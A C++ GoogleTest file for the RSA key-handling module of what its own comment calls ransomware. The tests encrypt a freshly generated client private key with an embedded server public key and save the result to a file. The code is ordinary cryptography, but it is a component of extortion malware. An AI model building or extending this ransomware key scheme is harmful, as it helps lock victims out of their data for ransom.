#include <memory>
#include <gtest/gtest.h>

#include "crypto/rsaEncryptor.h"
#include "crypto/serverPublicKey.h"
#include "params.h"

/**
 * Testclass RSAEncryptorTest
 */
class RSAEncryptorTest : public ::testing::Test
{

    protected:
        std::unique_ptr<butterfly::rsa::RSAEncryptor> rsaEncryptAESKey;
        std::unique_ptr<butterfly::rsa::RSAEncryptor> rsaEncryptCPrivateRSA;

    void SetUp() override
    {
        // Init rsaEncryptCPrivateRSA with Server Public Key embedded in ransomware
        rsaEncryptCPrivateRSA.reset(new butterfly::rsa::RSAEncryptor(butterfly::rsa::SPUBLIC_PEM));
        // Init rsaEncryptAESKey with keysize 2048
        rsaEncryptAESKey.reset( new butterfly::rsa::RSAEncryptor(2048));
    }

    void TearDown() override
    {

    }
};

/**
 * Testcase for CPrivateRSA string
 */
TEST_F(RSAEncryptorTest, CPrivateRSA_String)
{
    std::string cprivateRSAKeyFile = rsaEncryptAESKey->getRSAPrivateKeyStr();
    ASSERT_TRUE(!cprivateRSAKeyFile.empty());
}


/**
 * Testcase for EncryptedCPrivateRSA String
 */
TEST_F(RSAEncryptorTest, EncryptedCPrivateRSA_String)
{
    std::string encCPrivateRSA = rsaEncryptCPrivateRSA->getEncryptedMessage();
}

/**
 * Testcase for Encryption
 */
TEST_F(RSAEncryptorTest, Encryption)
{
    std::string cprivateRSAKeyFile = rsaEncryptAESKey->getRSAPrivateKeyStr();
    ASSERT_TRUE(!cprivateRSAKeyFile.empty());

    rsaEncryptCPrivateRSA->encryptEVP(rsaEncryptCPrivateRSA->getEvpPkey(), cprivateRSAKeyFile, butterfly::RSAKEY_TYPE::CPRIVATE_RSA);

    std::string encCPrivateRSA = rsaEncryptCPrivateRSA->getEncryptedMessage();
    ASSERT_TRUE(!encCPrivateRSA.empty());

    rsaEncryptCPrivateRSA->saveEncryptedMsgToFile(butterfly::ENC_CPRIVATERSA_FILENAME, encCPrivateRSA, static_cast<int>(encCPrivateRSA.length()));
}